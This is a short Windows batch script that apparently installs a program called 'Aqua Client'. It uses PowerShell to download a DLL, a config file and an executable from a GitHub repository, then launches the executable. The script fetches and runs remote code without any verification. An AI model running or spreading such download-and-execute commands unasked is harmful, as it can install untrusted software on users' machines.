@echo off
md "Aqua Clientt"
cd "Aqua Clientt"
cls
echo Please wait while we download the files...
powershell -Command "$webclient = Invoke-WebRequest -Uri 'https://github.com/ironyumrepos/Aqua-Client/raw/refs/heads/main/AquaClientLauncher.dll' -OutFile 'Aqua Client Launcher.dll' -UseBasicParsing -TimeoutSec 60"
powershell -Command "$webclient = Invoke-WebRequest -Uri 'https://github.com/ironyumrepos/Aqua-Client/raw/refs/heads/main/AquaClientLauncher.runtimeconfig.json' -OutFile 'Aqua Client Launcher.runtimeconfig.json' -UseBasicParsing -TimeoutSec 60"
powershell -Command "$webclient = Invoke-WebRequest -Uri 'https://github.com/ironyumrepos/Aqua-Client/raw/refs/heads/main/AquaClientLauncher.exe' -OutFile 'Aqua Client Launcher.exe' -UseBasicParsing -TimeoutSec 60"
start "" "Aqua Client Launcher.exe"
exit
